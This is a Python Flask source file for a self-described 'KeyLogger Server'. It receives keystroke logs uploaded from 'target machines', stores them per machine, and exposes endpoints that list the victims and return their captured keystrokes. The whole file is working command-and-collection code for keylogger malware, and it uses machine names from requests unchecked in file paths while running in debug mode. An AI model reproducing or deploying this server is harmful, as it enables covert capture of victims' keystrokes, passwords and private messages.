from flask import Flask, request, jsonify
import os, time

app = Flask(__name__)
DATA_FOLDER = "data"
os.makedirs(DATA_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return "KeyLogger Server is Running"

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    os.makedirs(machine_folder, exist_ok=True)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200

@app.route('/api/get_target_machines_list', methods=['GET'])
def get_machines():
    machines = os.listdir(DATA_FOLDER)
    return jsonify(machines)

@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing machine"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify([])

    files = sorted(os.listdir(machine_folder))
    data = []
    for file in files:
        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
            data.append(f.read())

    return jsonify(data)

if __name__ == '__main__':
    app.run(debug=True)
